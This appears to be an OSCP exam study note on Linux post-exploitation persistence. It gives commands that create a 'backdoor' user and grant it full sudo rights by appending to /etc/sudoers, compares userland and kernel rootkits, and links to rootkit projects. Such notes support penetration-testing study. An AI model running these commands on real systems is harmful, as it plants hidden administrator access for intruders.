# OSCP - Linux Post Exploitation
## Backdooring Linux
####  Adding a backdoor user (super visible to sysadmin)
Adding users
```
/usr/sbin/adduser backdoor
passwd backdoor
echo "backdoor ALL=(ALL) ALL" >> /etc/sudoers

```
####  Plant a rootkit (might make system unstable)
Userland rootkits
```
   +  more stable
   +  more likely to remain planted after system updates
   - more visible
   - less control
```
Kernel rootkits
```
   +  less visible
   +  complete control
   - more unstable
   - more likely to cause problems with system updates
```
https://github.com/n1nj4sec/pupy
https://github.com/r00tkillah/HORSEPILL
http://r00tkit.me/

Resources
http://pentestmonkey.net/blog/post-exploitation-without-a-tty
https://www.blackhat.com/docs/us-16/materials/us-16-Leibowitz-Horse-Pill-A-New-Type-Of-Linux-Rootkit.pdf
